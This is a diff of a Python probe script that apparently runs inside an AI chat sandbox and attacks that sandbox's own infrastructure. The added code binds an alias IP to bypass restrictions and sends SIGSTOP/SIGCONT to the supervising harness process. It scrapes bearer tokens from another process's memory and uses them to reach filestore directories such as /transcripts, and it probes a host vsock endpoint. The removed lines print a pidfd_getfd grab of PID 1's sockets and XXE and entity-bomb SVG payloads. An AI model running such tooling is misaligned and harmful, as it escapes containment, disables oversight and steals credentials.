@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
-# mediafit.py v8.5 -- pidfd_getfd->HOST CHANNEL + control-enum + SVG parser + OTLP fix
-import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random, ctypes
+# mediafit.py v8.6 -- PROCESS TABLE + SIGSTOP THE HARNESS + MD5 INTEGRITY
+import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random, hashlib
 
-VER, NONCE = "8.5", "%04x" % random.randint(0, 0xffff)
+VER, NONCE = "8.6", "%04x" % random.randint(0, 0xffff)
 OUT = "/mnt/user-data/outputs/mediafit-report.txt"
 IFACE, ALIAS = "eth0", "192.0.2.3"
 FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
@@ -72,7 +72,7 @@ def ws_recv(s, timeout=1.0):
         return op, d
     except Exception as e: return "err", repr(e).encode()
 
-def ws_read(s, dur=3.5, show=True, tag=""):
+def ws_read(s, dur=2.5, show=True, tag=""):
     t0, out = time.time(), []
     while time.time()-t0 < dur:
         op, d = ws_recv(s, 1.0)
@@ -82,26 +82,9 @@ def ws_read(s, dur=3.5, show=True, tag=""):
         t = d.decode(errors="replace")
         if show and op in (1, 2):
             w("      %s<< %s(%d) %s" % (tag, "BIN" if op == 2 else "TEXT", len(d),
-              t[:900].replace("\n", " | ")))
+              t[:800].replace("\n", " | ")))
         out.append(t)
     return out
-
-def conn_msg(pid, prog, args, uid=0, gid=0, mem=268435456, tmo=60, reuse=True):
-    return {"process_id": pid, "allow_process_id_reuse": reuse,
-            "create_req": {"name": prog, "args": args, "env_vars": {}, "timeout": tmo,
-                           "clear_env": False, "uid": uid, "gid": gid,
-                           "allow_process_id_reuse": reuse, "reattachable": True,
-                           "memory_limit_bytes": mem}}
-
-def do(msg, label, dur=3.0, show=True):
-    s = ws_hs(ALIAS)
-    if not s: return None
-    try:
-        ws_send(s, json.dumps(msg) if not isinstance(msg, str) else msg)
-        return ws_read(s, dur, show, "[%s]" % label)
-    finally:
-        try: s.close()
-        except Exception: pass
 
 def talk(msgs, label, dur=2.5, show=True):
     s = ws_hs(ALIAS)
@@ -115,6 +98,13 @@ def talk(msgs, label, dur=2.5, show=True):
     finally:
         try: s.close()
         except Exception: pass
+
+def conn_msg(pid, prog, args, uid=0, gid=0, mem=268435456, tmo=60, reuse=True):
+    return {"process_id": pid, "allow_process_id_reuse": reuse,
+            "create_req": {"name": prog, "args": args, "env_vars": {}, "timeout": tmo,
+                           "clear_env": False, "uid": uid, "gid": gid,
+                           "allow_process_id_reuse": reuse, "reattachable": True,
+                           "memory_limit_bytes": mem}}
 
 SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
 def _ifr(n, ip=None):
@@ -133,95 +123,74 @@ def add_secondary(ifname, ip):
         except OSError: pass
     return "fail"
 
-def vi(n):
-    out = b""
-    while True:
-        b = n & 0x7F; n >>= 7
-        if n: out += bytes([b | 0x80])
-        else: return out + bytes([b])
-def ld(f, p): return vi((f << 3) | 2) + vi(len(p)) + p
-def pstr(f, s): return ld(f, s.encode())
-def pdouble(f, v): return vi((f << 3) | 1) + struct.pack("<d", v)
+def pstate(pid):
+    try:
+        d = open("/proc/%d/stat" % pid).read()
+        return d[d.rindex(")") + 2]
+    except Exception as e:
+        return "?"
 
 def main():
     w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE,
       time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
-    sec("0. IDENTITY")
+    sec("0. IDENTITY + CGROUP PROCESS TABLE")
     cg = open("/proc/self/cgroup").read()
     m = re.search(r"/process_api/([^/\n]+)", cg)
     HID = m.group(1) if m else None
-    w("  HARNESS process_id = %s" % HID)
-    w("  persist: " + sh("wc -l /tmp/mf_api_persist.log 2>/dev/null; stat -c %y /tmp/mf_api_persist.log 2>/dev/null").replace("\n"," | "))
+    PPID = os.getppid()
+    w("  HARNESS process_id (from our cgroup) = %s" % HID)
+    w("  our pid=%d ppid=%d  parent_state=%s" % (os.getpid(), PPID, pstate(PPID)))
+    try:
+        pcg = open("/proc/%d/cgroup" % PPID).read()
+        w("  parent cgroup = %s" % pcg.replace("\n", " | "))
+    except Exception as e: w("  parent cgroup err %r" % e)
+    for d in ("/sys/fs/cgroup/memory/process_api", "/sys/fs/cgroup/process_api"):
+        w("  ls %s:" % d)
+        w("    " + sh("ls -la %s 2>&1 | head -40" % d).replace("\n", "\n    "))
+    w("  -- /proc/1/stat state: " + pstate(1))
     if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
     if not ws_hs(ALIAS): w("  BYPASS FAILED"); flush(); return
     w("  bypass OK")
 
-    sec("A. FULL CLIENT->SERVER CONTROL MESSAGE LIST (bogus variant trick)")
-    s = ws_hs(ALIAS)
-    if s:
-        ws_send(s, json.dumps(conn_msg("mf_list", "/bin/sh", ["-c", "sleep 30"], tmo=90)))
-        ws_read(s, 2.0, show=False)
-        ws_send(s, '{"Bogus":null}')
-        ws_read(s, 3.0, show=True, tag="[enum]")
-        s.close()
+    sec("A. CONTROL VARIANT ENUMERATION (one by one)")
+    cands = ['{"Resize":{"rows":30,"cols":100}}', '{"KeepAlive":null}', '{"Closed":null}',
+             '{"Attach":null}', '{"Detach":null}', '{"StdinEOF":null}', '{"StdInEOF":null}',
+             '{"Stdin":null}', '{"PtyResize":null}', '{"Eof":null}']
+    for c in cands:
+        r = talk([conn_msg("mf_var", "/bin/sh", ["-c", "sleep 20"], tmo=60), c], "var", 2.0, show=False)
+        j = " ".join(r or [])
+        verdict = "VALID" if "unknown variant" not in j else "invalid"
+        w("  %-34s -> %-8s %s" % (c, verdict, j[:110]))
 
-    sec("B. HARNESS PROCESS: attach / Kill / SendSignal variants")
+    sec("B. *** SIGSTOP / SIGCONT THE HARNESS'S OWN PROCESS ***")
     if HID:
-        for label, seq in (
-            ("attach",        [{"process_id": HID, "allow_process_id_reuse": False}]),
-            ("attach+kill",   [{"process_id": HID, "allow_process_id_reuse": False}, '{"Kill":null}']),
-            ("attach+sig0",   [{"process_id": HID, "allow_process_id_reuse": False}, '{"SendSignal":0}']),
-            ("reuse+kill",    [{"process_id": HID, "allow_process_id_reuse": True}, '{"Kill":null}']),
-            ("reuse+sig0",    [{"process_id": HID, "allow_process_id_reuse": True}, '{"SendSignal":0}']),
-        ):
-            r = talk(seq, label, 4.0, show=True)
-            w("    %-14s -> %s" % (label, " ".join(r or [])[:150]))
+        before = pstate(PPID)
+        w("  parent state BEFORE      : %s" % before)
+        talk([{"process_id": HID, "allow_process_id_reuse": False}], "a", 1.5, show=False)
+        s = ws_hs(ALIAS)
+        if s:
+            ws_send(s, json.dumps({"process_id": HID, "allow_process_id_reuse": False}))
+            ws_read(s, 1.2, show=False)
+            ws_send(s, '{"SendSignal":19}')          # SIGSTOP
+            ws_read(s, 1.2, show=False)
+            time.sleep(0.8)
+            mid = pstate(PPID)
+            w("  parent state AFTER SIGSTOP: %s   <-- 'T' = STOPPED = SIGNAL DELIVERED" % mid)
+            ws_send(s, '{"SendSignal":18}')          # SIGCONT
+            ws_read(s, 1.2, show=False)
+            s.close()
+            time.sleep(0.8)
+            w("  parent state AFTER SIGCONT: %s" % pstate(PPID))
+        w("  -- also try SIGSTOP via a fresh connection --")
+        talk([{"process_id": HID, "allow_process_id_reuse": False}, '{"SendSignal":19}'], "stop2", 1.5, show=False)
+        time.sleep(0.6); w("    state=%s" % pstate(PPID))
+        talk([{"process_id": HID, "allow_process_id_reuse": False}, '{"SendSignal":18}'], "cont2", 1.5, show=False)
+        time.sleep(0.6); w("    state=%s" % pstate(PPID))
+        w("  -- try Kill on a THROWAWAY id first --")
+        talk([{"process_id": "no_such_proc_zz", "allow_process_id_reuse": False}], "noproc", 2.0)
 
-    sec("C. *** pidfd_getfd ON PID 1 -> HOST CHANNEL ***")
-    try:
-        libc = ctypes.CDLL("libc.so.6", use_errno=True)
-        pidfd = libc.syscall(434, 1, 0)          # pidfd_open(1, 0)
-        w("  pidfd_open(1) = %s" % pidfd)
-        found = []
-        for fd in range(0, 96):
-            nf = libc.syscall(438, pidfd, fd, 0)  # pidfd_getfd(pidfd, fd, 0)
-            if nf < 0: continue
-            info = {"fd": fd, "dup": nf}
-            try:
-                s2 = socket.socket(fileno=nf)
-                info["fam"] = s2.family; info["type"] = s2.type
-                try: info["peer"] = s2.getpeername()
-                except Exception: info["peer"] = "-"
-                try: info["local"] = s2.getsockname()
-                except Exception: info["local"] = "-"
-                if info["fam"] == getattr(socket, "AF_VSOCK", 40):
-                    found.append((fd, nf, info))
-                s2.detach()
-            except Exception:
-                info["note"] = "not a socket"
-                try: os.close(nf)
-                except Exception: pass
-            w("    fd %-3d -> %s" % (fd, info))
-        w("  vsock sockets on PID 1: %s" % [f[0] for f in found])
-        for fd, nf, info in found:
-            try:
-                s3 = socket.socket(fileno=os.dup(nf))
-                s3.settimeout(2.0)
-                try:
-                    s3.sendall(b"MF_PROBE_FROM_GUEST\n")
-                    w("    fd %d send OK peer=%s" % (fd, info.get("peer")))
-                except Exception as e:
-                    w("    fd %d send err %r" % (fd, e))
-                try:
-                    d = s3.recv(256); w("    fd %d recv=%r" % (fd, d[:120]))
-                except Exception as e: w("    fd %d recv err %r" % (fd, e))
-                s3.detach()
-            except Exception as e: w("    fd %d use err %r" % (fd, e))
-    except Exception as e:
-        w("  pidfd ERR " + repr(e))
-
-    sec("D. SVG SERVER-SIDE PARSER SURFACE")
-    cands = []
+    sec("C. MD5 INTEGRITY (server transforms SVG: what does md5 cover?)")
+    cands_t = []
     try:
         fh = open("/proc/57/mem", "rb", buffering=0); total, buf = 0, b""
         for ln in open("/proc/57/maps").read().splitlines():
@@ -234,26 +203,26 @@ def main():
         fh.close()
     except Exception: buf = b""
     for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,200}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,200}", buf):
-        cands.append(mm.group(0).decode())
+        cands_t.append(mm.group(0).decode())
     def b64d(x):
         x += "=" * (-len(x) % 4); return base64.urlsafe_b64decode(x)
     import urllib.request as ur
-    def call(path, tok, fsid=FSID, method="listDirectory", extra=None, raw=None, ctype=None, hdrs=None):
+    def call(path, tok, fsid=FSID, method="listDirectory", extra=None, raw=None, ctype=None):
         if raw is not None: data, ct = raw, ctype
         else:
             body = {"path": path}
             if fsid: body["filesystem_id"] = fsid
             if extra: body.update(extra)
             data, ct = json.dumps(body).encode(), "application/json"
-        h = {"Content-Type": ct, "Connect-Protocol-Version": "1", "Authorization": "Bearer " + tok}
-        if hdrs: h.update(hdrs)
         try:
-            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method, data=data, headers=h)
+            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method, data=data,
+                            headers={"Content-Type": ct, "Connect-Protocol-Version": "1",
+                                     "Authorization": "Bearer " + tok})
             with ur.urlopen(rq, timeout=10) as r: return r.status, dict(r.headers), r.read()
         except ur.HTTPError as e: return e.code, dict(e.headers), e.read()
         except Exception as e: return "ERR", {}, repr(e).encode()
     TOKS = {}
-    for t in cands:
+    for t in cands_t:
         p = t.split(".")
         if len(p) != 3 or len(p[2]) < 86: continue
         try: pl = json.loads(b64d(p[1]))
@@ -266,55 +235,67 @@ def main():
     w("  tokens=%s" % sorted(TOKS))
     tok = TOKS.get("/outputs")
     if tok:
-        tests = [
-            ("xxe.svg", "image/svg+xml",
-             b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
-             b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'),
-            ("billion.svg", "image/svg+xml",
-             b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "AAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
-             b'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><svg xmlns="http://www.w3.org/2000/svg"><text>&c;</text></svg>'),
-            ("pi.svg", "image/svg+xml",
-             b'<?xml version="1.0"?><?xml-stylesheet href="file:///etc/passwd" type="text/css"?>'
-             b'<svg xmlns="http://www.w3.org/2000/svg"><text>pi</text></svg>'),
-            ("deep.svg", "image/svg+xml",
-             b"<svg xmlns='http://www.w3.org/2000/svg'>" + b"<g>"*400 + b"</g>"*400 + b"</svg>"),
-        ]
-        for fn, mt, content in tests:
-            bnd = "----s%d" % random.randint(10000, 99999)
-            body = b"\r\n".join([
-                ("--"+bnd).encode(), b'Content-Disposition: form-data; name="params"',
-                b"Content-Type: application/json", b"",
-                json.dumps({"filesystem_id": FSID, "path": "/outputs/"+fn, "media_type": mt}).encode(),
-                ("--"+bnd).encode(),
-                ('Content-Disposition: form-data; name="file"; filename="%s"' % fn).encode(),
-                ("Content-Type: "+mt).encode(), b"", content,
-                ("--"+bnd+"--").encode(), b""])
-            c, h, b = call(None, tok, method="createFile", raw=body,
-                           ctype="multipart/form-data; boundary="+bnd)
-            w("  create %-12s -> %-5s %s" % (fn, c, b[:120]))
-            if c == 200:
-                c2, h2, b2 = call("/outputs/"+fn, tok, method="readFile")
-                w("      readFile -> %-5s len=%d %s" % (c2, len(b2), b2[:220]))
-                w("      ctype=%s csp=%s" % (h2.get("content-type"), h2.get("content-security-policy")))
-        w("  -- does readFile honour Accept: text/html ? --")
-        c, h, b = call("/outputs/__mf_x.html", tok, method="readFile",
-                       hdrs={"Accept": "text/html"})
-        w("      Accept:text/html -> %-5s ctype=%s" % (c, h.get("content-type")))
+        content = b"<svg xmlns='http://www.w3.org/2000/svg'><text>integrity</text></svg>"
+        bnd = "----i%d" % random.randint(10000, 99999)
+        body = b"\r\n".join([
+            ("--"+bnd).encode(), b'Content-Disposition: form-data; name="params"',
+            b"Content-Type: application/json", b"",
+            json.dumps({"filesystem_id": FSID, "path": "/outputs/__mf_int.svg",
+                        "media_type": "image/svg+xml"}).encode(),
+            ("--"+bnd).encode(),
+            b'Content-Disposition: form-data; name="file"; filename="__mf_int.svg"',
+            b"Content-Type: image/svg+xml", b"", content,
+            ("--"+bnd+"--").encode(), b""])
+        c, h, b = call(None, tok, method="createFile", raw=body,
+                       ctype="multipart/form-data; boundary="+bnd)
+        w("  create -> %s" % c)
+        try:
+            j = json.loads(b); f = (j.get("file") or {}).get("file") or {}
+            w("    reported md5 = %s  size = %s" % (f.get("md5"), f.get("size")))
+            w("    md5(sent %d bytes) = %s" % (len(content), hashlib.md5(content).hexdigest()))
+            c2, h2, b2 = call("/outputs/__mf_int.svg", tok, method="readFile")
+            w("    stored size=%d md5(stored)=%s" % (len(b2), hashlib.md5(b2).hexdigest()))
+            if f.get("md5"):
+                w("    >>> MATCH stored? %s   MATCH sent? %s" %
+                  (f.get("md5") == hashlib.md5(b2).hexdigest(),
+                   f.get("md5") == hashlib.md5(content).hexdigest()))
+        except Exception as ex: w("    " + repr(ex)[:200])
+        w("  -- do /transcripts and /tool_results have entries now? --")
+        for r2 in ("/transcripts", "/tool_results", "/uploads"):
+            if r2 in TOKS:
+                c3, h3, b3 = call(r2, TOKS[r2], extra={"recursive": True})
+                try:
+                    n = len(json.loads(b3).get("entries") or [])
+                    w("    %-14s -> %s entries=%d" % (r2, c3, n))
+                except Exception: w("    %-14s -> %s %s" % (r2, c3, b3[:80]))
 
-    sec("E. HOST OTLP (protobuf FIXED)")
+    sec("D. HOST OTLP (more variants)")
     AFV = getattr(socket, "AF_VSOCK", 40)
-    res = ld(1, pstr(1, "service.name") + ld(2, pstr(1, "mediafit")))
+    def vi(n):
+        o = b""
+        while True:
+            b2 = n & 0x7F; n >>= 7
+            if n: o += bytes([b2 | 0x80])
+            else: return o + bytes([b2])
+    def ld(f, p): return vi((f << 3) | 2) + vi(len(p)) + p
+    def pstr(f, s): return ld(f, s.encode())
+    def pdouble(f, v): return vi((f << 3) | 1) + struct.pack("<d", v)
+    attrs = (pstr(1, "service.name") + ld(2, pstr(1, "mediafit")) +
+             pstr(1, "container.id") + ld(2, pstr(1, "mf")) +
+             pstr(1, "session.id") + ld(2, pstr(1, "mf")))
+    res = ld(1, attrs)
     scope = ld(2, pstr(1, "mf_probe") + ld(5, ld(1, pdouble(3, 1.0))))
-    rmet = ld(1, res) + ld(2, scope)          # FIXED: no double wrap
-    msg = ld(1, rmet)
-    for label, body, ct in (("otlp+res", msg, "application/x-protobuf"),
-                            ("empty", b"\x0a\x00", "application/x-protobuf"),
-                            ("grpc-frame", b"\x00"+struct.pack(">I", len(msg))+msg, "application/x-protobuf")):
+    msg = ld(1, ld(1, res) + ld(2, scope))
+    for label, body, ct, path in (("otlp+attrs", msg, "application/x-protobuf", "/v1/metrics"),
+                                  ("otlp-empty", b"\x0a\x00", "application/x-protobuf", "/v1/metrics"),
+                                  ("logs", b"\x0a\x00", "application/x-protobuf", "/v1/logs"),
+                                  ("traces", b"\x0a\x00", "application/x-protobuf", "/v1/traces"),
+                                  ("root", b"\x0a\x00", "application/x-protobuf", "/")):
         try:
             s = socket.socket(AFV, socket.SOCK_STREAM); s.settimeout(8.0); s.connect((2, 5005))
-            s.sendall(("POST /v1/metrics HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n"
+            s.sendall(("POST %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n"
                        "Content-Type: %s\r\nContent-Length: %d\r\n\r\n"
-                       % (ct, len(body))).encode()+body)
+                       % (path, ct, len(body))).encode()+body)
             d = b""
             try:
                 while len(d) < 2048:
@@ -322,12 +303,12 @@ def main():
                     if not c: break
                     d += c
             except socket.timeout: pass
-            s.close(); w("  %-11s len=%-4d -> %s" % (label, len(body),
-              d[:130].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
-        except Exception as e: w("  %-11s ERR %r" % (label, e))
-        time.sleep(0.4)
+            s.close(); w("  %-12s %-12s -> %s" % (label, path, d[:110].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
+        except Exception as e: w("  %-12s ERR %r" % (label, e))
+        time.sleep(0.3)
 
-    sec("VERDICT"); w("  harness_id=%s tokens=%d" % (HID, len(TOKS))); flush()
+    sec("VERDICT"); w("  harness_id=%s parent_state=%s tokens=%d" % (HID, pstate(PPID), len(TOKS)))
+    flush()
 
 try: main()
 except Exception as e: w(); w("FATAL " + repr(e))
